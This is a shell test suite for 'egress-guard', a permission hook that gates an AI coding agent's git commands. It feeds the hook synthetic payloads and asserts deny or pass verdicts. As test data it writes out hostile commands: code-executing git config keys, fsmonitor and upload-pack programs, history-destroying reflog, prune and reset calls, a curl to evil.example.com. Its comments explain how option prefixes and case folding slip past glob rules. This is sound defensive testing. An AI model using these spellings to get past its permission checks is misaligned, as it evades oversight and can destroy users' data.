#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

source "$SCRIPT_DIR/helpers.sh"

# Regression corpus for egress-guard's three git gates, driven by synthetic PreToolUse
# payloads on stdin — no live tool call, no real config written and no file deleted
# anywhere. All three exist because every git deny is a glob, and a glob cannot see
# either of the two things git does with its own syntax: fold the case of a config key,
# and accept a run of global options in front of a subcommand.
#
#   GITEXEC      a `git config` write to a key that makes git run a command later
#   GITDESTRUCT  a destructive subcommand reached behind a git-level option
#   GITCFG       `-c` or `--config-env` reached behind another git-level option
#
# ── GITEXEC ────────────────────────────────────────────────────────────────────────
# What it guards. `git config alias.z '!git clean -fdx'` is an ordinary config write and
# the destruction happens later, in `git z`, where no rule has a verb to match. Two glob
# denies cover the common spelling at the permission layer. They cannot cover the rest,
# and each gap below is a verdict asserted here rather than a claim in a comment:
#
#   * git's section and variable names are case-insensitive, permission globs are not, so
#     `git config Alias.z …` walks past both globs. `alias` alone has 32 case spellings.
#   * core.pager, core.editor, core.hooksPath, sequence.editor, credential.helper and
#     diff.external each name a program git runs later and were covered only in the
#     one-shot `git -c key=value` form.
#   * `git config --edit` opens an editor on the config and names no key at all.
#
# What it must NOT do, which is the larger half of the file. A read is ordinary work and
# an ordinary key is most of what `git config` is for: a false positive here breaks
# /quick-commit and every normal setup step, and the workaround for a false positive is
# identical to the workaround for a true positive, so a noisy gate teaches evasion.
#
# ── GITDESTRUCT ────────────────────────────────────────────────────────────────────
# Every destructive-git deny is a glob anchored on the literal subcommand, so a git-level
# option sits where the glob expects `git` and none of them match. Only `git -C` and
# `git -c` are denied; the rest of the set `git --help` lists is open, and the ones that
# pass through to a subcommand each accept both `--opt=v` and `--opt v` and are
# repeatable and combinable, so no glob set enumerates them.
#
# That pass MIRRORS the deny rules and changes no tier's policy, which is itself asserted
# here: it fires only on the PREFIXED spelling (the unprefixed one is already decided at
# the permission layer), and never wider than the rule it mirrors. So the unprefixed
# corpus below must come back silent — a hook that started deciding those would be the
# failure, not the fix — and the excluded subcommand (`branch -D`) and the reads beside
# the included ones (`reflog show`, `gc --auto`, `fetch --prune`) must come back silent
# even prefixed.
#
# ── GITCFG ─────────────────────────────────────────────────────────────────────────
# `git -c core.fsmonitor=/tmp/x.sh status` is arbitrary code execution, and
# `git --config-env=core.fsmonitor=X status` is the same with the value read from $X.
# Both rules are anchored on the first token after `git`, so `git --no-pager -c …`
# walked past `Bash(git -c *)` before this gate existed, and `--config-env` had no rule
# at all. Same mirror, same scope: the first-position spelling is the rules' and must
# stay silent here, and a message or a pattern that merely names either option is data.
#
# ── both ───────────────────────────────────────────────────────────────────────────
# Every expectation is paired with a MUTATION CONTROL at the bottom: the same corpus is
# replayed against a deliberately broken copy of the guard, and the suite fails unless
# the verdict flips. An assertion that passes against a guard with its key table emptied
# is not testing the guard. The exclusions get controls too, in the other direction: a
# subcommand is ADDED to the destructive set and the silent expectation has to flip.
echo "[test_git_guard] egress-guard's three git gates: the config keys, prefixed subcommands and prefixed config options no glob can reach, and everything ordinary they must leave alone"
echo ""

WORK="$(new_tmp)" || exit 1
if [ -z "${WORK:-}" ] || [ ! -d "$WORK" ]; then
  echo "  FAIL: could not create a temp dir (mktemp -d returned '${WORK:-}')"
  exit 1
fi
trap 'rm -rf "$WORK"' EXIT

SETTINGS="$REPO_ROOT/.claude/settings.json"
GUARD_SRC="$REPO_ROOT/.claude/hooks/egress-guard.awk"

assert_file_exists "$SETTINGS" ".claude/settings.json exists"
assert_file_exists "$GUARD_SRC" ".claude/hooks/egress-guard.awk exists"
if [ ! -f "$SETTINGS" ] || [ ! -f "$GUARD_SRC" ]; then
  print_summary
fi

# ── the registered hook command, not a hand-written invocation ──────────────
# Read out of settings.json so the suite exercises what Claude Code actually runs. A
# guard that works when called directly and is wired up wrong is the dangerous state.
GUARD="$(python3 - "$SETTINGS" <<'PY'
import json, sys
hooks = (json.load(open(sys.argv[1])).get("hooks") or {}).get("PreToolUse") or []
for entry in hooks:
    matcher = entry.get("matcher") or ""
    if matcher and "Bash" not in matcher:
        continue
    for h in entry.get("hooks", []):
        if "egress-guard" in (h.get("command") or ""):
            print(h["command"])
            raise SystemExit
PY
)"
TOTAL=$((TOTAL + 1))
if [ -n "$GUARD" ]; then
  echo "  PASS: settings.json wires egress-guard into PreToolUse for Bash"
  PASS=$((PASS + 1))
else
  echo "  FAIL: no PreToolUse Bash hook in settings.json runs egress-guard"
  FAIL=$((FAIL + 1))
  print_summary
fi

# ── fixtures ────────────────────────────────────────────────────────────────
# One project per guard variant. The hook resolves its script under
# CLAUDE_PROJECT_DIR, so pointing that at a fixture with a mutated copy of
# egress-guard.awk is all a mutation control needs.
mkfixture() { # mkfixture <dir> <tier>
  mkdir -p "$1/.claude"
  cp -R "$REPO_ROOT/.claude/hooks" "$1/.claude/hooks"
  cp "$SETTINGS" "$1/.claude/settings.json"
  python3 - "$REPO_ROOT/.claude/security.json" "$1/.claude/security.json" "$2" <<'PY'
import json, sys
src, dst, tier = sys.argv[1:4]
try:
    d = json.load(open(src))
except Exception:
    d = {}
d["tier"] = tier
json.dump(d, open(dst, "w"), indent=2)
PY
}
mkfixture "$WORK/proj" relaxed

# ask_in <project-dir> <tier> <command> -> DENY | ASK | PASS | ERROR:<rc>
ask_in() {
  local payload out rc norm
  payload="$(python3 -c '
import json, sys
print(json.dumps({"hook_event_name": "PreToolUse", "tool_name": "Bash",
                  "tool_input": {"command": sys.argv[1]}}))' "$3")"
  set +e
  out="$( (cd "$1" && printf '%s' "$payload" \
    | CLAUDE_PROJECT_DIR="$1" KIT_FIREWALL_TIER="$2" \
      KIT_FIREWALL_HEADLESS="${KIT_TEST_HEADLESS:-0}" sh -c "$GUARD") 2>&1 )"
  rc=$?
  set -e
  norm="$(printf '%s' "$out" | tr -d ' \n')"
  if [ "$rc" -eq 2 ]; then echo DENY; return; fi
  if [ "$rc" -ne 0 ]; then echo "ERROR:$rc"; return; fi
  case "$norm" in
    *'"permissionDecision":"deny"'*) echo DENY ;;
    *'"permissionDecision":"ask"'*)  echo ASK ;;
    *)                               echo PASS ;;
  esac
}

# expect <tier> <want> <label> <command>
expect() {
  local got; got="$(ask_in "$WORK/proj" "$1" "$4")"
  TOTAL=$((TOTAL + 1))
  if [ "$got" = "$2" ]; then
    echo "  PASS: [$1] $2  $3"
    PASS=$((PASS + 1))
  else
    echo "  FAIL: [$1] want $2, got $got  $3"
    FAIL=$((FAIL + 1))
  fi
}

# ── the code-executing keys, across every spelling ──────────────────────────
echo ""
echo "[code-executing keys: denied at every tier]"
expect relaxed DENY "the alias evasion #229 named"            "git config alias.z '!git clean -fdx'"
expect relaxed DENY "the case spelling no glob can reach"     "git config Alias.z '!git clean -fdx'"
expect relaxed DENY "all upper"                               "git config ALIAS.Z '!x'"
expect relaxed DENY "mixed case, mid-word"                    "git config aLiAs.co checkout"
expect relaxed DENY "core.pager"                              "git config core.pager 'sh -c evil'"
expect relaxed DENY "core.pager, mixed case"                  "git config Core.Pager 'sh -c evil'"
expect relaxed DENY "core.editor"                             "git config core.editor ./evil.sh"
expect relaxed DENY "core.hooksPath"                          "git config core.hooksPath .evilhooks"
expect relaxed DENY "core.hooksPath, lowercase spelling"      "git config core.hookspath .evilhooks"
expect relaxed DENY "core.hooksPath, all upper"               "git config CORE.HOOKSPATH .evilhooks"
expect relaxed DENY "sequence.editor"                         "git config sequence.editor ':'"
expect relaxed DENY "credential.helper"                       "git config credential.helper '!evil'"
expect relaxed DENY "credential.<url>.helper subsection form" "git config credential.https://github.com.helper '!evil'"
expect relaxed DENY "credential subsection, mixed case ends"  "git config Credential.https://GitHub.com.HELPER '!evil'"
expect relaxed DENY "diff.external"                           "git config diff.external ./evil.sh"

echo ""
echo "[write spellings]"
expect relaxed DENY "--global"             "git config --global alias.z '!x'"
expect relaxed DENY "--local"              "git config --local alias.z '!x'"
expect relaxed DENY "--system"             "git config --system alias.z '!x'"
expect relaxed DENY "--worktree"           "git config --worktree alias.z '!x'"
expect relaxed DENY "--file <f>"           "git config --file /tmp/f alias.z '!x'"
expect relaxed DENY "--file=<f>"           "git config --file=/tmp/f alias.z '!x'"
expect relaxed DENY "-f <f>"               "git config -f /tmp/f Alias.z '!x'"
expect relaxed DENY "--add"                "git config --add alias.z '!x'"
expect relaxed DENY "--replace-all"        "git config --replace-all alias.z '!x'"
expect relaxed DENY "--type with the key"  "git config --global --type=path core.hooksPath .h"
expect relaxed DENY "git config set"       "git config set alias.z '!x'"
expect relaxed DENY "git config set, flag between" "git config set --append alias.z '!x'"
expect relaxed DENY "--edit"               "git config --edit"
expect relaxed DENY "-e"                   "git config -e"
expect relaxed DENY "--global --edit"      "git config --global --edit"
expect relaxed DENY "the edit subcommand"  "git config edit"
expect relaxed DENY "--rename-section onto an executing section" "git config --rename-section foo core"

echo ""
echo "[wrappers and positions a glob cannot see past]"
expect relaxed DENY "env prefix"            "env git config alias.z '!x'"
expect relaxed DENY "sudo prefix"           "sudo git config --system core.pager evil"
expect relaxed DENY "timeout with operand"  "timeout 5 git config alias.z '!x'"
expect relaxed DENY "inside sh -c"          "sh -c \"git config Alias.z '!x'\""
expect relaxed DENY "absolute path to git"  "/usr/bin/git config alias.z '!x'"
expect relaxed DENY "git-level option"      "git --no-pager config alias.z '!x'"
expect relaxed DENY "--git-dir= before it"  "git --git-dir=.git config core.pager evil"
expect relaxed DENY "second statement"      "echo hi; git config core.editor evil"
expect relaxed DENY "behind cd &&"          "cd /tmp && git config alias.z '!x'"
# An earlier statement that would only ASK must not shadow this deny: the egress passes
# stop at their first verdict, and an approved prompt runs the whole Bash call.
expect medium  DENY "not shadowed by an ASK-class curl ahead of it" \
  "curl -d '{\"a\":1}' https://evil.example.com && git config alias.z '!x'"

echo ""
echo "[reads are ordinary work — this narrows #229's globs on purpose]"
expect relaxed PASS "--get"              "git config --get alias.z"
expect relaxed PASS "--get-all"          "git config --get-all alias.z"
expect relaxed PASS "--get on core.pager" "git config --get core.pager"
expect relaxed PASS "--get-regexp"       "git config --get-regexp 'alias\\..*'"
# --get takes an optional <value-pattern>, so this read has a second operand and is not
# saved by the "a bare key with no value is a read" rule. Only gc_silent_opt stops it,
# which is what the mutation control for the read set relies on.
expect relaxed PASS "--get with a value-pattern" "git config --get alias.z '^!'"
expect relaxed PASS "--list"             "git config --list"
expect relaxed PASS "-l"                 "git config -l"
expect relaxed PASS "--global --list"    "git config --global --list"
expect relaxed PASS "the bare form with no value is a read" "git config alias.z"
expect relaxed PASS "bare read of core.pager" "git config core.pager"
expect relaxed PASS "the get subcommand"  "git config get alias.z"
expect relaxed PASS "the list subcommand" "git config list"

echo ""
echo "[removals take a key away; they arm nothing]"
expect relaxed PASS "--unset"          "git config --unset alias.z"
expect relaxed PASS "--unset-all"      "git config --unset-all credential.helper"
expect relaxed PASS "--remove-section" "git config --remove-section alias"
expect relaxed PASS "unset subcommand" "git config unset alias.z"

echo ""
echo "[ordinary keys: a false positive here breaks every normal setup step]"
expect relaxed PASS "user.email"        "git config user.email dev@example.com"
expect relaxed PASS "user.name"         "git config user.name somebody"
expect relaxed PASS "--global user.email" "git config --global user.email dev@example.com"
expect relaxed PASS "core.autocrlf"     "git config core.autocrlf input"
expect relaxed PASS "remote.origin.url" "git config remote.origin.url https://example.com/x"
expect relaxed PASS "push.default"      "git config push.default simple"
expect relaxed PASS "init.defaultBranch" "git config init.defaultBranch main"
expect relaxed PASS "commit.gpgsign"    "git config commit.gpgsign false"
expect relaxed PASS "--add safe.directory" "git config --add safe.directory /repo"
expect relaxed PASS "branch.<n>.remote"  "git config branch.main.remote origin"
expect relaxed PASS "--rename-section onto an ordinary section" "git config --rename-section foo bar"

echo ""
echo "[prose: naming the command is not running it]"
expect relaxed PASS "in a commit message" "git commit -m \"git config alias.z '!x' is the evasion\""
expect relaxed PASS "in an echo"          "echo \"git config core.pager evil\""
expect relaxed PASS "in a --grep pattern" "git log --grep=\"git config core.hooksPath\""
expect relaxed PASS "in a printf"         "printf '%s\\n' 'git config alias.z x'"
# A dangerous key in operand position under a DIFFERENT git subcommand. This is the case
# the subcommand anchor exists for, and the mutation control for that anchor uses it.
expect relaxed PASS "a key as a git grep pattern" "git grep core.hooksPath docs/"
expect relaxed PASS "a key as a git log pattern"  "git log -S alias.z -- src/"
expect relaxed PASS "in a heredoc body"   "cat <<'EOF'
git config alias.z '!x'
EOF"

# ── destructive subcommands behind a git-level option ──────────────────────
# Every destructive-git deny is a glob anchored on the literal subcommand, so a
# git-level option sits where the glob expects `git` and none of them match.
# Only `git -C` and `git -c` are shut, of the whole set `git --help` lists before
# <command>. This pass closes the rest by MIRRORING those rules: it
# fires only on the prefixed spelling, because the unprefixed one is already
# decided at the permission layer at every tier, and it is never wider than the
# rule it mirrors.
echo ""
echo "[the prefix bypass: each global-option form the rules cannot see past]"
for pfx in "--no-pager" "--git-dir=.git" "-P" "--literal-pathspecs" "-C ." "--bare" \
           "--no-optional-locks" "--namespace ns" "--git-dir .git" "--attr-source HEAD" \
           "-c core.pager=less" "--exec-path=/tmp"; do
  expect relaxed DENY "git $pfx clean -fdx" "git $pfx clean -fdx"
done

echo ""
echo "[each included subcommand, prefixed]"
expect relaxed DENY "clean --dry-run is denied by Bash(git clean *) too, so this mirrors it" \
  "git --no-pager clean --dry-run"
expect relaxed DENY "clean -n, likewise"            "git --no-pager clean -n"
expect relaxed DENY "restore"                        "git --no-pager restore ."
expect relaxed DENY "restore --staged, mirroring Bash(git restore *)" \
  "git --no-pager restore --staged src/lib.rs"
expect relaxed DENY "checkout -- <path>"             "git --no-pager checkout -- ."
expect relaxed DENY "checkout -- <path>, -P prefix"  "git -P checkout -- src/lib.rs"
expect relaxed DENY "reset --hard"                   "git --no-pager reset --hard HEAD~3"
expect relaxed DENY "reset --ha, the abbreviation git accepts" "git --no-pager reset --ha HEAD~3"
expect relaxed DENY "reflog expire — the one that makes history unrecoverable" \
  "git --no-pager reflog expire --expire=now --all"
expect relaxed DENY "reflog delete — removes chosen entries, the record expire takes away" \
  "git --no-pager reflog delete HEAD@{1}"
expect relaxed DENY "reflog delete --rewrite --updateref, -P prefix" \
  "git -P reflog delete --rewrite --updateref refs/stash@{0}"
expect relaxed DENY "reflog drop --all — removes whole reflogs" "git --no-pager reflog drop --all"
expect relaxed DENY "reflog drop <ref>, --git-dir <dir> prefix" \
  "git --git-dir .git reflog drop refs/heads/main"
expect relaxed DENY "prune — Bash(git prune *) denies it at every tier, so the prefixed spelling is denied to match" \
  "git --no-pager prune"
expect relaxed DENY "prune --expire=now, -P prefix"   "git -P prune --expire=now"
expect relaxed DENY "prune behind a wrapper"          "env git --no-pager prune"
expect relaxed DENY "gc --prune=now — what prune deletes, reached through gc" \
  "git --no-pager gc --prune=now"
expect relaxed DENY "gc --prune=all, -P prefix"       "git -P gc --prune=all"
expect relaxed DENY "gc --prune with no date"         "git --no-pager gc --prune"
expect relaxed DENY "gc --prune after another gc flag" "git --no-pager gc --aggressive --prune=now"
expect relaxed DENY "push --mirror"                  "git --no-pager push --mirror origin"
expect relaxed DENY "push --receive-pack=<prog>"     "git --no-pager push --receive-pack=/tmp/x.sh origin main"
expect relaxed DENY "push --exec=<prog>"             "git --no-pager push --exec=/tmp/x.sh origin main"
expect relaxed DENY "fetch --upload-pack=<prog>"     "git --no-pager fetch --upload-pack=/tmp/x.sh ."
expect relaxed DENY "pull --upload-pack=<prog>"      "git --no-pager pull --upload-pack=/tmp/x.sh ."
expect relaxed DENY "clone --upload-pack=<prog>"     "git --no-pager clone --upload-pack=/tmp/x.sh ."
expect relaxed DENY "ls-remote --upload-pack=<prog>" "git --no-pager ls-remote --upload-pack=/tmp/x.sh ."
expect relaxed DENY "behind env"                     "env git --no-pager clean -fd"
expect relaxed DENY "inside sh -c"                   "sh -c \"git --no-pager clean -fd\""
expect relaxed DENY "second statement"               "echo hi; git -P clean -fd"
expect relaxed DENY "absolute path to git"           "/usr/bin/git --no-pager clean -fd"

echo ""
echo "[the bare forms, prefixed: each glob's trailing * matches them too]"
# A trailing ` *` that is a rule's only wildcard is optional in Claude Code's matcher, so
# Bash(git clean *) denies a bare `git clean` (verified live: bare `chown` is refused by
# Bash(chown *) with no twin beside it). The mirror has to deny the prefixed bare form,
# and for clean that is not cosmetic: with clean.requireForce false a bare `git clean`
# deletes untracked files, and --config-env sets that inside the same command line.
expect relaxed DENY "bare clean"                     "git --no-pager clean"
expect relaxed DENY "bare clean with clean.requireForce turned off in the same line" \
  "RF=false git --config-env=clean.requireForce=RF clean"
expect relaxed DENY "bare restore"                   "git -P restore"
expect relaxed DENY "bare checkout --"               "git --no-pager checkout --"
expect relaxed DENY "bare reflog expire"             "git -P reflog expire"
expect relaxed DENY "bare reflog delete"             "git -P reflog delete"
expect relaxed DENY "bare reflog drop"               "git --no-pager reflog drop"

echo ""
echo "[UNPREFIXED: the glob rules own these, and the hook stays out of the way]"
expect relaxed PASS "clean"          "git clean -fdx"
expect relaxed PASS "bare clean"     "git clean"
expect relaxed PASS "prune"          "git prune"
expect relaxed PASS "restore"        "git restore ."
expect relaxed PASS "checkout --"    "git checkout -- ."
expect relaxed PASS "reset --hard"   "git reset --hard HEAD~3"
expect relaxed PASS "reflog expire"  "git reflog expire --expire=now --all"
expect relaxed PASS "reflog delete"  "git reflog delete HEAD@{1}"
expect relaxed PASS "reflog drop"    "git reflog drop --all"
expect relaxed PASS "gc --prune"     "git gc --prune=now"
expect relaxed PASS "push --mirror"  "git push --mirror origin"
expect relaxed PASS "fetch --upload-pack" "git fetch --upload-pack=/tmp/x.sh ."

echo ""
echo "[the word in a message or a pattern, never in subcommand position]"
expect relaxed PASS "--grep"               "git log --grep=\"clean up the tests\""
expect relaxed PASS "commit -m reset"      "git commit -m \"reset the counter\""
expect relaxed PASS "commit -m prune"      "git commit -m \"prune dead branches\""
expect relaxed PASS "--grep, prefixed"     "git --no-pager log --grep=\"clean up the tests\""
expect relaxed PASS "commit -m, prefixed"  "git --no-pager commit -m \"reset the counter\""
expect relaxed PASS "the command quoted in a message" \
  "git --no-pager commit -m \"git clean -fdx is destructive\""
expect relaxed PASS "in an echo"           "echo \"git --no-pager clean -fdx\""
expect relaxed PASS "as a -S pickaxe"      "git --no-pager log -S 'git clean -fdx'"

echo ""
echo "[excluded on purpose, and ordinary git, both prefixed]"
# branch -D/-f is OUT: reflog-recoverable, and -D against a safe -d plus -f clustered in
# -Df is the worst parsing surface in the set. `--sort=-date` already tripped a -d matcher
# in this same guard once.
expect relaxed PASS "branch -d, the safe delete"  "git --no-pager branch -d old-branch"
expect relaxed PASS "branch -D, excluded as reflog-recoverable" "git --no-pager branch -D old-branch"
expect relaxed PASS "branch --sort=-date"         "git --no-pager branch --sort=-date"
# prune is IN, as the subcommand only, and gc only with a --prune token. These share
# the word and are other commands, or gc doing its ordinary repack.
expect relaxed PASS "worktree prune"              "git --no-pager worktree prune"
expect relaxed PASS "remote prune"                "git -P remote prune origin"
expect relaxed PASS "prune-packed"                "git --no-pager prune-packed"
expect relaxed PASS "fetch --prune"               "git --no-pager fetch --prune"
expect relaxed PASS "plain gc"                    "git --no-pager gc"
expect relaxed PASS "gc --auto"                   "git -P gc --auto"
expect relaxed PASS "gc --aggressive"             "git --no-pager gc --aggressive"
expect relaxed PASS "gc --no-prune, which Bash(git gc *--prune*) does not match either" \
  "git --no-pager gc --no-prune"
expect relaxed PASS "gc --prune named in a --grep" "git --no-pager log --grep=\"gc --prune\""
# reflog is IN only as expire, delete and drop, the word right after `reflog`. The rest
# of it reads.
expect relaxed PASS "bare reflog, prefixed"        "git --no-pager reflog"
expect relaxed PASS "bare reflog"                  "git reflog"
expect relaxed PASS "reflog list, prefixed"        "git --no-pager reflog list"
expect relaxed PASS "reflog list"                  "git reflog list"
expect relaxed PASS "reflog show <ref>, prefixed"  "git -P reflog show --date=iso HEAD"
expect relaxed PASS "reflog show"                  "git reflog show"
expect relaxed PASS "reflog exists, prefixed"      "git --no-pager reflog exists refs/heads/main"
expect relaxed PASS "reflog exists"                "git reflog exists refs/heads/main"
expect relaxed PASS "reflog drop named in a message" \
  "git --no-pager commit -m \"reflog drop and reflog delete are denied now\""
expect relaxed PASS "stash"                       "git --no-pager stash"
expect relaxed PASS "status"                      "git --no-pager status"
expect relaxed PASS "switch"                      "git --no-pager switch main"
expect relaxed PASS "checkout <branch>, no --"    "git --no-pager checkout main"
expect relaxed PASS "checkout -b"                 "git --no-pager checkout -b feature"
expect relaxed PASS "reset --soft"                "git --no-pager reset --soft HEAD~1"
expect relaxed PASS "bare reset only unstages"    "git --no-pager reset HEAD~1"
expect relaxed PASS "reset --mixed"               "git --no-pager reset --mixed HEAD"
expect relaxed PASS "reflog, with no expire"      "git --no-pager reflog show"
expect relaxed PASS "an ordinary push"            "git --no-pager push origin main"
expect relaxed PASS "an ordinary fetch"           "git --no-pager fetch origin"
expect relaxed PASS "pull --rebase"               "git --no-pager pull --rebase"
expect relaxed PASS "diff"                        "git --no-pager diff"
expect relaxed PASS "add -A"                      "git --no-pager add -A"
# Mirroring the glob means mirroring where it stops: `Bash(git checkout -- *)` anchors
# `--` right after the subcommand.
expect relaxed PASS "checkout <tree-ish> -- <path>, open in both layers" \
  "git --no-pager checkout HEAD -- src/lib.rs"
expect relaxed PASS "checkout --force -- ., open in both layers" \
  "git --no-pager checkout --force -- ."

# ── -c and --config-env behind another git-level option ─────────────────────
# Both rules are anchored on the first token after `git`, so any other option in front
# walks past them. Measured on main before this gate: `git --no-pager -c
# core.fsmonitor=/tmp/x.sh status` reached neither a rule nor the hook.
echo ""
echo "[GITCFG: -c and --config-env behind another git-level option]"
for pfx in "--no-pager" "-P" "--git-dir=.git" "--git-dir .git" "--bare" \
           "--literal-pathspecs" "--namespace ns"; do
  expect relaxed DENY "git $pfx --config-env=<k>=<var>" "git $pfx --config-env=core.fsmonitor=X status"
  expect relaxed DENY "git $pfx --config-env <k>=<var>, the spaced spelling" \
    "git $pfx --config-env core.fsmonitor=X status"
  expect relaxed DENY "git $pfx -c <k>=<prog>" "git $pfx -c core.fsmonitor=/tmp/x.sh status"
done
expect relaxed DENY "behind a VAR=value"          "X=/tmp/x.sh git --no-pager --config-env=core.fsmonitor=X status"
expect relaxed DENY "behind env"                  "env X=/tmp/x.sh git -P --config-env=core.fsmonitor=X status"
expect relaxed DENY "inside sh -c"                "sh -c \"git --no-pager --config-env=core.fsmonitor=X status\""
expect relaxed DENY "second statement"            "echo hi; git -P -c core.pager=evil log"
expect relaxed DENY "absolute path to git"        "/usr/bin/git --no-pager --config-env=core.fsmonitor=X status"
expect relaxed DENY "with no subcommand after it" "git --no-pager --config-env=core.fsmonitor=X"
expect relaxed DENY "a one-command alias"         "git --no-pager -c alias.x='!evil' x"
expect relaxed DENY "a second -c, after the first one the rule denies" \
  "git -c user.name=x -c core.fsmonitor=/tmp/x.sh status"
expect relaxed DENY "beside a destructive subcommand, which also fires" \
  "git --no-pager --config-env=clean.requireForce=RF clean"

echo ""
echo "[UNPREFIXED config options: the rules own these, and the hook stays out of the way]"
expect relaxed PASS "--config-env=<k>=<var> first" "git --config-env=core.fsmonitor=X status"
expect relaxed PASS "--config-env <k>=<var> first" "git --config-env core.fsmonitor=X status"
expect relaxed PASS "behind a VAR=value, which a deny rule matches past" \
  "X=/tmp/x.sh git --config-env=core.fsmonitor=X status"
expect relaxed PASS "-c first"                     "git -c core.fsmonitor=/tmp/x.sh status"

echo ""
echo "[the two options named as data: a message, a pattern, an echo]"
expect relaxed PASS "in a commit message"          "git commit -m \"block git --config-env and git -c\""
expect relaxed PASS "the prefixed form quoted in a prefixed message" \
  "git --no-pager commit -m \"git --no-pager --config-env=core.pager=x log\""
expect relaxed PASS "-c in a prefixed message"     "git --no-pager commit -m \"-c core.pager=x\""
expect relaxed PASS "as a --grep pattern"          "git log --grep=--config-env"
expect relaxed PASS "as a prefixed --grep pattern" "git --no-pager log --grep=\"--config-env=core.pager=x\""
expect relaxed PASS "as a -S pickaxe"              "git --no-pager log -S \"--config-env\""
expect relaxed PASS "in an echo"                   "echo \"git --no-pager --config-env=core.pager=x log\""
expect relaxed PASS "as a grep pattern"            "grep -rn -- \"--config-env\" docs/"
expect relaxed PASS "in a heredoc body"            "cat <<'EOF'
git --no-pager -c core.fsmonitor=/tmp/x.sh status
EOF"

# ── the walk itself: options that take a word, and options that end git ───────
# Three ways the walk used to land on the wrong token, each found in review and each
# reproduced on main before the fix: an undocumented git-level option that takes an
# operand, a wrapper option that takes one, and an option after which git runs no
# subcommand at all. The first two were misses; the third was a false positive.
echo ""
echo "[--shallow-file takes the next word, so the subcommand after it is still found]"
expect relaxed DENY "clean"          "git --shallow-file x clean -fdx"
expect relaxed DENY "config core.hooksPath" "git --shallow-file x config core.hooksPath .evil"
expect relaxed DENY "reflog expire"  "git --shallow-file x reflog expire --expire=now --all"
expect relaxed DENY "push --mirror"  "git --shallow-file x push --mirror origin"
expect relaxed DENY "prune"          "git --shallow-file x prune"
expect relaxed DENY "reset --hard"   "git --shallow-file x reset --hard HEAD~3"
expect relaxed DENY "a later --config-env" "git --shallow-file x --config-env=core.fsmonitor=X status"
expect relaxed PASS "status"         "git --shallow-file x status --short"

echo ""
echo "[wrapper options that take a word: the command after them is still git]"
expect relaxed DENY "nice -n 5"             "nice -n 5 git --no-pager clean -fdx"
expect relaxed DENY "nice -n 5, config"     "nice -n 5 git config core.hooksPath .evil"
expect relaxed DENY "timeout -s KILL 5"     "timeout -s KILL 5 git --no-pager clean -fdx"
expect relaxed DENY "timeout -s KILL 5, config" "timeout -s KILL 5 git config core.hooksPath .evil"
expect relaxed DENY "timeout -k 5 10"       "timeout -k 5 10 git --no-pager reflog expire --expire=now --all"
expect relaxed DENY "xargs -n 1"            "xargs -n 1 git --no-pager prune"
expect relaxed DENY "stdbuf -o 0"           "stdbuf -o 0 git --no-pager clean -fdx"
expect relaxed DENY "exec -a x"             "exec -a x git --no-pager clean -fdx"
expect relaxed DENY "env -u HOME"           "env -u HOME git --no-pager clean -fdx"
expect relaxed DENY "sudo -u me"            "sudo -u me git --no-pager clean -fdx"
expect relaxed DENY "nice -n 5, GITCFG"     "nice -n 5 git -P --config-env=core.fsmonitor=X status"
expect relaxed PASS "nice -n 5 git status"  "nice -n 5 git status"
expect relaxed PASS "timeout -s KILL 5, prefixed status" "timeout -s KILL 5 git --no-pager status"

echo ""
echo "[help, version and path queries: git prints and stops, so nothing runs]"
# `git --help clean` is `git help clean`, which no rule denies; denying it made the
# hook stricter than the glob it mirrors.
expect relaxed PASS "--help clean"            "git --help clean"
expect relaxed PASS "--help prune"            "git --help prune"
expect relaxed PASS "--help restore"          "git --help restore"
expect relaxed PASS "--help clean -fdx"       "git --help clean -fdx"
expect relaxed PASS "-h clean"                "git -h clean"
expect relaxed PASS "-h prune, -P first"      "git -P -h prune"
expect relaxed PASS "--help clean, --no-pager first" "git --no-pager --help clean"
expect relaxed PASS "--help config <key> <value>" "git --no-pager --help config core.hooksPath .evil"
expect relaxed PASS "-v"                      "git -v"
expect relaxed PASS "--version clean"         "git --version clean"
expect relaxed PASS "--html-path"             "git --html-path"
expect relaxed PASS "--man-path"              "git --man-path"
expect relaxed PASS "--info-path"             "git --info-path"
expect relaxed PASS "--list-cmds=main"        "git --list-cmds=main"
expect relaxed PASS "a bare --exec-path"      "git --exec-path"
expect relaxed PASS "a bare --exec-path, words after it ignored" "git --exec-path /tmp clean"
expect relaxed DENY "--exec-path=<dir> sets the path and runs the subcommand" "git --exec-path=/tmp clean -fdx"
# git help reads config (man.<tool>.cmd, web.browser), so a -c ahead of --help counts.
expect relaxed DENY "a -c behind another option, ahead of --help" "git --no-pager -c man.viewer=x --help clean"

echo ""
echo "[tiers: the deny does not ladder, and holds headless]"
expect off     PASS "Off disables GITCFG too"    "git --no-pager --config-env=core.fsmonitor=X status"
expect medium  DENY "GITCFG at Medium"           "git --no-pager --config-env=core.fsmonitor=X status"
expect high    DENY "GITCFG at High"             "git -P -c core.pager=evil log"
KIT_TEST_HEADLESS=1 expect relaxed DENY "GITCFG headless" "git -P -c core.pager=evil log"
expect off     PASS "Off disables this pass too" "git --no-pager clean -fdx"
expect medium  DENY "Medium"                     "git --no-pager clean -fdx"
expect high    DENY "High"                       "git --no-pager clean -fdx"
KIT_TEST_HEADLESS=1 expect relaxed DENY "headless" "git --no-pager reflog expire --all"
expect off     PASS "Off disables the hook, like every other gate" "git config core.hooksPath .h"
expect relaxed DENY "Relaxed"                                      "git config core.hooksPath .h"
expect medium  DENY "Medium"                                       "git config core.hooksPath .h"
expect high    DENY "High"                                         "git config core.hooksPath .h"
KIT_TEST_HEADLESS=1 expect relaxed DENY "headless: a deny is not an ask, so it cannot go quiet" \
  "git config core.hooksPath .h"
KIT_TEST_HEADLESS=1 expect high    DENY "headless at High"         "git config alias.z '!x'"

# ── the MCP surface ────────────────────────────────────────────────────────
# context-mode ships in .mcp.json and ctx_execute runs outside the Bash tool AND outside
# the OS sandbox, so the hook is the only pattern layer in front of it.
echo ""
echo "[MCP: context-mode's executor]"
MCP_OUT="$( (cd "$WORK/proj" && python3 -c '
import json
print(json.dumps({"hook_event_name": "PreToolUse",
                  "tool_name": "mcp__context-mode__ctx_execute",
                  "tool_input": {"code": "git config alias.z \x27!git clean -fdx\x27",
                                 "language": "shell"}}))' \
  | CLAUDE_PROJECT_DIR="$WORK/proj" KIT_FIREWALL_TIER=relaxed KIT_FIREWALL_HEADLESS=0 \
    sh -c "$GUARD") 2>&1 || true )"
assert_contains "$MCP_OUT" '"permissionDecision":"deny"' "an MCP shell payload is gated too"
